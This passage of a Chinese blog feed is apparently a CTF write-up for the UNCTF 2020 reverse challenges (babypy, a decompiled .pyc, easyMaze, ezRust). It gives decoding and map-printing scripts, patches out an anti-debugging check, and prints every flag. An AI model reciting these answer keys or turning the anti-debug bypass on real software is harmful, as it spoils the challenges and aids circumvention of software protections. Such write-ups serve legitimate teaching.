babypy.pyc</span></span><br></pre></td></tr></table></figure><p>加密顺序：<br>字符串转十进制int<br>将十进制数从右往左一位一位转换成二进制存入l列表<br>l列表逆序<br>将l列表转换成字符串<br>把列表l转换成bytes然后再转成16进制<br>转成十进制int<br>转成16进制string</p><p>然后就用到一开始给的tip：<br><img src="https://img-blog.csdnimg.cn/20201107175448979.png#pic_center" alt="在这里插入图片描述"><br>所以这里的0 1 3其实是0x30 = ‘0’ 0x31 = ‘1’<br>知道原理就可以写脚本了</p><h3 id="0x03-脚本解密"><a href="#0x03-脚本解密" class="headerlink" title="0x03 脚本解密"></a>0x03 脚本解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum,binascii</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&#x27;313131303130313031313031313130303131303030313130313131303130303031313030313130303131313130313130313031303130303031313031303030303130303030303030313131303130303031303131313131303131303130303130313131303031313031303131313131303131313030313030313130303130313031313030303031303031313030303130303131303030313031313131303031303130313131313130313130303031313030313130303030303031313030303030303131303030313031313131313031&#x27;</span></span><br><span class="line">a = binascii.a2b_hex(ciphertext)</span><br><span class="line">a = a.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = <span class="built_in">str</span>(a)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c = <span class="built_in">int</span>(a,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(c) </span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(c))</span><br></pre></td></tr></table></figure><p>运行得到flag:unctf{Th@t_is_rea11y_c001}</p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p> 解包，pyc转py步骤和上题一样。<br> 得到的py文件直接运行即可得到flag<br> <img src="https://img-blog.csdnimg.cn/20201113141935592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="easyMaze"><a href="#easyMaze" class="headerlink" title="easyMaze"></a>easyMaze</h2><h3 id="0x00-逆向分析-1"><a href="#0x00-逆向分析-1" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h3><p><img src="https://img-blog.csdnimg.cn/20201113142043477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入的字符串被存入Dst中，然后经过两个函数的判断，如果返回都为1则通过。</p><h4 id="sub-401757"><a href="#sub-401757" class="headerlink" title="sub_401757"></a><em>sub_401757</em></h4><p><img src="https://img-blog.csdnimg.cn/20201113142226441.png#pic_center" alt="在这里插入图片描述"><br>很容易读懂（猜到）要求输入的flag开头要为unctf{，结尾要为}。</p><h4 id="sub-40161A"><a href="#sub-40161A" class="headerlink" title="sub_40161A"></a><em>sub_40161A</em></h4><p><img src="https://img-blog.csdnimg.cn/20201113142435267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>很容易看出是wasd移动，然后因为是10*v3所以大概率地图的宽度是10，然后如果走到D或者0就会直接return 0所以不能走。<br>最后如果走到S会break，然后return 1。所以S是终点。</p><h3 id="0x01-找地图"><a href="#0x01-找地图" class="headerlink" title="0x01 找地图"></a>0x01 找地图</h3><p><img src="https://img-blog.csdnimg.cn/20201113142619481.png#pic_center" alt="在这里插入图片描述"><br>很容易看出Dst就是地图的指针,但是直接跳过去看不到内容，尝试动态调试。</p><p>但是会发现这里有一个函数<img src="https://img-blog.csdnimg.cn/20201113142731808.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201113142739486.png#pic_center" alt="在这里插入图片描述"><br>这个函数会检测是否是debug状态，即反动调。<br>但是这个很简单，只要改一下if的判断就能绕过<br><img src="https://img-blog.csdnimg.cn/20201113142831660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201113142902707.png#pic_center" alt="在这里插入图片描述"><br>可以看到这里的if中加了一个！即不是debug才会执行反动调。<br>然后就可以快乐动调了：<br><img src="https://img-blog.csdnimg.cn/2020111314300091.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>下断点<br><img src="https://img-blog.csdnimg.cn/20201113143017253.png#pic_center" alt="在这里插入图片描述"><br>要先通过第一个函数的检测所以要以unctf{开头，}结尾<br>运行。<br><img src="https://img-blog.csdnimg.cn/20201113143103764.png#pic_center" alt="在这里插入图片描述"><br>可以看到Dst指向一个地址，jump过去看看<br><img src="https://img-blog.csdnimg.cn/20201113143126758.png#pic_center" alt="在这里插入图片描述"><br>获得地图<br>复制进脚本看一下地图长啥样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;Oo00oD00SD0oooo0Doooo0D0oD0o00ooooo00o00oD0D0oooooo00o0o0o0ooDoooooDDDo00o00oooooD0D0000oDoooooooooD&quot;</span></span><br><span class="line">a = a.replace(<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">a = a.replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i,end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> count%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#dsdddssaaaassssssddddddddwwaawawwddwwwdw</span></span><br></pre></td></tr></table></figure><p>我顺便把地图里的D和0都删了<br>输出结果是这样的：<br><img src="https://img-blog.csdnimg.cn/20201113143242707.png#pic_center" alt="在这里插入图片描述"><br>从左上角走到S，路径也在代码里了。<br>所以flag就是unctf{dsdddssaaaassssssddddddddwwaawawwddwwwdw}</p><h2 id="ezRust"><a href="#ezRust" class="headerlink" title="ezRust"></a>ezRust</h2><p>本以为是一个非常困难恶心人的汇编题目，但是仔细分析发现逻辑还是十分简单的。</p><h3 id="0x00-逆向分析-2"><a href="#0x00-逆向分析-2" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h3><p><img src="https://img-blog.csdnimg.cn/20201113143454311.png#pic_center" alt="在这里插入图片描述"><br>F12就会发现有类似flag的字符串，双击过去<br><img src="https://img-blog.csdnimg.cn/20201113143521440.png#pic_center" alt="在这里插入图片描述"><br>跳转到引用函数<br><img src="https://img-blog.csdnimg.cn/20201113143549796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现它只是把这个字符串的字符用指针取不同位置的不同长度字符重组的。<br>从上往下读可以得到flag：unctf{Rust_more_safety_than_YLB’s_Platform}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UNCTF-2020-Reverse方向&quot;&gt;&lt;a href=&quot;#UNCTF-2020-Reverse方向&quot; class=&quot;headerlink&quot; title=&quot;[UNCTF 2020]Reverse方向&quot;&gt;&lt;/a&gt;[UNCTF 2020]Reverse方向&lt;/h1</summary>
      
    
    
    
    <category term="UNCTF2020" scheme="http://blog.k0nashi.cn/categories/UNCTF2020/"/>
    
    
    <category term="UNCTF" scheme="http://blog.k0nashi.cn/tags/UNCTF/"/>
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Reverse" scheme="http://blog.k0nashi.cn/tags/Reverse/"/>
    
  </entry>
  
</feed>
